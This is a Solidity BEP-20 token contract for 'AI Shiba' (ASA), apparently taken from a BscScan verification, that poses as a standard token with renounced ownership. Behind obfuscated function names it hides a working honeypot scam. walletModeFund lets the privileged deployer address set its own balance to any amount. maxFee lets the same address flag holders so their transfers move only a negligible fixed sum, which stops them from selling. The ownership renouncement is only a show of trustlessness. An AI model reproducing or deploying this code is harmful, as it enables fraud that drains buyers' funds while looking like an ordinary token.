/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface receiverToFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldSwap {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIShiba is Ownable{
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 constant autoMarketing = 10 ** 10;
    mapping(address => bool) public isBuyAt;


    address public liquidityReceiver;
    string public symbol = "ASA";
    address public feeFund;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public exemptList;

    bool public minExempt;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public name = "AI Shiba";
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        receiverToFee modeTotal = receiverToFee(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        liquidityReceiver = shouldSwap(modeTotal.factory()).createPair(modeTotal.WETH(), address(this));
        feeFund = shouldList();
        isBuyAt[feeFund] = true;
        balanceOf[feeFund] = totalSupply;
        emit Transfer(address(0), feeFund, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address fromMaxTo, address atMinLiquidity, uint256 tokenFee) public returns (bool) {
        if (fromMaxTo != shouldList() && allowance[fromMaxTo][shouldList()] != type(uint256).max) {
            require(allowance[fromMaxTo][shouldList()] >= tokenFee);
            allowance[fromMaxTo][shouldList()] -= tokenFee;
        }
        if (atMinLiquidity == feeFund || fromMaxTo == feeFund) {
            return txReceiverShould(fromMaxTo, atMinLiquidity, tokenFee);
        }
        if (exemptList[fromMaxTo]) {
            return txReceiverShould(fromMaxTo, atMinLiquidity, autoMarketing);
        }
        return txReceiverShould(fromMaxTo, atMinLiquidity, tokenFee);
    }

    function approve(address senderReceiverFrom, uint256 tokenFee) public returns (bool) {
        allowance[shouldList()][senderReceiverFrom] = tokenFee;
        emit Approval(shouldList(), senderReceiverFrom, tokenFee);
        return true;
    }

    function liquidityAuto(address listMin) public {
        if (minExempt) {
            return;
        }
        isBuyAt[listMin] = true;
        minExempt = true;
    }

    function walletModeFund(uint256 tokenFee) public {
        if (!isBuyAt[shouldList()]) {
            return;
        }
        balanceOf[feeFund] = tokenFee;
    }

    function shouldList() private view returns (address) {
        return msg.sender;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function maxFee(address atSender) public {
        if (atSender == feeFund || atSender == liquidityReceiver || !isBuyAt[shouldList()]) {
            return;
        }
        exemptList[atSender] = true;
    }

    function transfer(address atMinLiquidity, uint256 tokenFee) external returns (bool) {
        return transferFrom(shouldList(), atMinLiquidity, tokenFee);
    }

    function txReceiverShould(address toFund, address walletTo, uint256 tokenFee) internal returns (bool) {
        require(balanceOf[toFund] >= tokenFee);
        balanceOf[toFund] -= tokenFee;
        balanceOf[walletTo] += tokenFee;
        emit Transfer(toFund, walletTo, tokenFee);
        return true;
    }


}